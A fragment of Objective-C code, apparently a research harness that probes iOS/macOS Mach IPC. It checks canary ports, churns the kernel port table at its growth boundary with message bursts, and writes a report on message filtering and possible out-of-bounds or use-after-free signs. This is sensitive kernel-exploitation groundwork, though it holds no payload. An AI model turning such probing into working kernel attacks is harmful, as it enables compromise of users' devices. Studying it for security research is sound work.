    for (int i = 0; i < CANARY_N; i++) if (canaryAlive[i] == 1) aliveAfter++;
    [report appendFormat:@"canary after: %d/%d send-capable (status_changes=%d)\n", aliveAfter, CANARY_N, changed];
    if (changed > 0) {
        [report appendString:@"CANARY_SEND_FAILURES_UNVERIFIED — independent table evidence is required for attribution.\n"];
    } else {
        [report appendString:@"No canary send-status delta observed; no bit-set conclusion follows either way.\n"];
    }

    // Cleanup canaries
    for (int i = 0; i < CANARY_N; i++) {
        if (canary[i] != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), canary[i]);
    }

    [report appendString:@"\n--- itable churn + burst (growth boundary) ---\n"];
    for (int round = 0; round < 4; round++) {
        [self churnItableWithPorts:held count:256];
        for (int i = 0; i < 16; i++) {
            NSDictionary *r = [self sendReceiveCount:16 port:port sendRight:port];
            if ([r[@"recv_kr"] intValue] != 0 && [r[@"send_kr"] intValue] != 0) {
                [report appendFormat:@"round=%d burst=%d -> %@\n", round, i, r];
            }
        }
    }
    [self journal:[NSString stringWithFormat:@"CHURN_DONE held=%d", (int)held.count]];

    for (NSNumber *p in held) {
        mach_port_destroy(mach_task_self(), (mach_port_t)p.unsignedIntValue);
    }
    mach_port_destroy(mach_task_self(), port);

    [report appendString:@"\nVERDICT: SEE_JOURNAL\n"];
    [report appendString:
     @"Matrix reading:\n"
     @"  simple=0, complex fails    -> descriptor layout/filter is the cause\n"
     @"  complex0-id0 fails too     -> COMPLEX bit itself is filtered\n"
     @"  id0 works, id4b50 fails    -> msgh_id filtering (iOS mach message filter)\n"
     @"  everything works           -> the earlier failure was the 16B stride\n"
     @"Growth rounds report table_size/table_inuse before and after allocation/free.\n"
     @"Accepted messages and send failures are observations, not OOB/UAF proof.\n"
     @"A panic requires independent symbolication and index/base correlation before attribution.\n"];
    return report;
}

@end
